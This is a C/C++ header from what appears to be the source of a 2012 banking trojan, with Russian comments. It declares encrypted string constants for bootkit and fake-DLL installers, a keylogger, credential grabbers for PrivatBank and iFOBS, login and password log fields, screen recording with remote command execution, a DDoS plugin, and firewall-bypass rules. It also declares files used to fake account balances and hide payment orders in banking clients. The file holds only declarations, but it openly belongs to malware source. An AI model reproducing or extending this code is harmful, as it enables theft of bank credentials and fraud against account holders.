
//---------------------------------------------------------------------------
//  Модуль хранения строковыъ констант бота
//
//  Модифицирован: Июль 2012
//---------------------------------------------------------------------------

#ifndef StrConstsH
#define StrConstsH
//---------------------------------------------------------------------------

#include "Strings.h"

//тип кодируемой строки, выравнивается в один байт
#ifdef _MSC_VER
#	define CSSTR __declspec(align(1)) char
#else
#	define CSSTR char
#endif

//*****************************************************
// GetStr - Функция расшифровывает строку EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr);





//=====================================================
//  Публичное объявление строковых данных
//
//
//  Названия к наинаются с приставки EStr -
//  Encrypted String
//=====================================================

// Префикс глобального мьютекса сигнализирующего, что бот запущен
extern CSSTR StrBotGlobalMutexName[];
//мьютекс сигнализирующий, что запущен бот из под буткита
extern CSSTR StrBootkitIsRunMutex[]; 


// Оригинальное имя ехе файла бота
extern CSSTR EStrOriginalBotExeName[];
extern CSSTR EStrBotStartupLinkName[];  // Имя ярлыка в автозагрузке


// Имя файла для хранения хостов бота
extern CSSTR EStrHostsFileName[];


// Имя сервиса
extern CSSTR EStrServiceName[];

// Поддирректория сервиса
extern CSSTR EStrBotServiceExePath[];

// Имя ехе файла сервиса бота
extern CSSTR EStrBotServiceExeName[];


extern CSSTR StrBotWorkPath[];
extern CSSTR StrGrabberPath[];


extern CSSTR EStrConfigFileName[]; // Имя файла хранения конфига
extern CSSTR EStrConfigHPFileName[]; // Имя файла хранения конфига повышенного приоритета



//Имя систем граберов
extern CSSTR EStrSystemPrivat[]; // Грабер ключей приватбанка
extern CSSTR EStrSystemIfobsOnline[]; // Грабер системы Ifobs онлайн

// Имя кабов
extern CSSTR EStrCabNameDisketa[]; // Имя каба для отправки флопидисков



// имя сигнального файла бесконечного кейлогера
extern CSSTR EStrInfiniteKeyLoggerSignal[];


// Имена служебный пайпов
extern CSSTR EStrPipeLoader[]; // Имя служебного пайпа лоадера

// Служебные команды, передаваемые через пайпы процессам
extern CSSTR EStrProcessCommandDeleteBot[];  // Команда на удаление exe бота


// Имя фала префикса
extern CSSTR EStrPrefixFileName[];
extern CSSTR EStrTemporaryPrefixFileName[]; // Временный Файл хранения префикса

// Имена плагина бота в виде длл
extern CSSTR EStrBotPlug[];

// Имф инсталтора буткита
extern CSSTR EStrBootkitInstaller[];

// Имя инсталятора фэкедлл
extern CSSTR EStrFakeDllInstaller[];
// Имя файла по которому определяем, что установлена фейкдлл (файл в папке бота)
extern CSSTR EStrFakeDllFlag[];
//имя файла по которому определяем, что установлена фейкдлл в клиенте ифобс
extern CSSTR EStrFakeDllIFobsFlag[];
//имя файла по которому определяем, что установлена фейкдлл в клиенте сбанк
extern CSSTR EStrFakeDllCBankFlag[];

// Перечень команд, которые может выполняь бот
extern CSSTR EStrCommandInstallFakeDLL[];  // Команда на инсталяцию фэкедлл
extern CSSTR EStrCommandInstallBootkit[];  // Команда на инсталяцию буткита



// Имена файлов, для добавления в лог
extern CSSTR StrLogFileScreenShot[];
extern CSSTR StrLogFileTextData[];
extern CSSTR StrLogFileNetInfo[];
extern CSSTR EStrLogKeyPath[];


// Имяена полей лога
extern CSSTR EStrLogFieldLogin[];
extern CSSTR EStrLogFieldPassword[] ;
extern CSSTR EStrLogFieldKeyPassword[] ;
extern CSSTR EStrLogFieldURL[];


// Имена функций библиотеки видеозаписи.
extern CSSTR VideoRecFuncInit[];
extern CSSTR VideoRecFuncRelease[];
extern CSSTR VideoRecUpdateSettings[];
extern CSSTR VideoRecFuncAddIPServer[];
extern CSSTR VideoRecFuncRecordProcess[];
extern CSSTR VideoRecFuncRecordWnd[];
extern CSSTR VideoRecFuncStop[];
extern CSSTR VideoRecFuncResetTime[];
extern CSSTR VideoRecFuncSendFiles[];
extern CSSTR VideoRecFuncSendFilesAsync[];
extern CSSTR VideoRecFuncIsSendedAsync[];
extern CSSTR VideoRecFuncFolderIsUpload[];
extern CSSTR VideoRecFuncRunCmdExec[];
extern CSSTR VideoRecFuncSendLog[];
extern CSSTR VideoRecPipe[];
extern CSSTR VideoRecOutOfHibernation[];

// Константы модуля HTTP
extern CSSTR HTTPFormContentDisposition[];
extern CSSTR HTTPFormFieldName[]; // Шаблон формирования имени поля
extern CSSTR HTTPFormFileInfo[];  // Шаблон строки формирования информации о имени файла при отправке формы
extern CSSTR HTTPOctetStream[];


// Строки модуля AzConfig
extern CSSTR AzConfigParamUserName[];


// Строки модуля BSS грабера
extern CSSTR BSSLogTemplate[];


// Строки модуля FakeDllInstaller
extern CSSTR EStrFakeDllInstallerCommandParams[];
extern CSSTR EStrIBankRegistryPath[];
extern CSSTR EStrSberRegistryKey[];
extern CSSTR EStrIBankFileName[];

//файл-флаг копирование папки клиента IFobs
extern CSSTR IFobsFlagCopy[];


// Имя плагина DDOS
extern CSSTR EStrDDOSPlugin[];

// Имя файла данных для команды DDOS
extern CSSTR EStrDDOSSignal[];


//строка параметров для запуска RDP
extern CSSTR RDPRunParam[];

//для BSS CBank оффлайн
extern CSSTR CBankReplacement[]; //имя файла хранящий что подменять
extern CSSTR CBankFlagUpdate[]; //флаг для запуска подмены (был создан файл подмены)
extern CSSTR CBankRestFixed[]; //файл с данными о подмене

//для Tiny
extern CSSTR TinyReplacement[]; //имя файла хранящий что подменять
extern CSSTR TinyFlagUpdate[]; //флаг для запуска подмены (был создан файл подмены)
extern CSSTR TinyOldBalans[]; //имя файла для хранения подменяемого баланса, для восстановления
extern CSSTR TinyOldDocs[]; //имя файла для хранения данных по скрываемым платежкам, для восстановления

//команда для добавления в список доверенных браундмаузера
extern CSSTR NetshFirewallWinXp[]; //для windows XP
extern CSSTR NetshFirewallWin7Add[]; //для windows 7 добавление правила
extern CSSTR NetshFirewallWin7Del[]; //для windows 7 удаление правила

//*********************************************************************
//                            Не шифрованные строки и данные
//*********************************************************************


extern CSSTR Slash[];
extern CSSTR SlashChar;



#endif
